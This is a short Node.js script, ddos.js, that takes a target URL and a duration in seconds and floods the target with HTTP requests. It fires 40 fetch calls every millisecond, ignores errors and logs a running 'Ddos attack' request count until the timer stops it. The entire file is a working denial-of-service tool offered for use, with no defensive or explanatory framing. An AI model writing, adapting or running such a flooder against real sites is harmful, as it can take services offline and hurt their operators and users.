const target = process.argv[2];
const duration = process.argv[3];

if (process.argv.length < 4 || isNaN(parseInt(duration))) {
    console.log('Invalid Usage: node ddos.js URL DURATION.');
    process.exit(1)
} else {
    let permen = 0;
    const attackInterval = setInterval(() => {
        for (let i = 0; i < 40; i++) {
            console.log(`Ddos attack => ${target} Total Requests: ${permen}`);
            fetch(target).catch(error => {});
            permen++;
        }

    }, 1);

    setTimeout(() => {
        clearInterval(attackInterval);
        console.log('Attack stopped.');
        process.exit(0);
    }, duration * 1000);
}
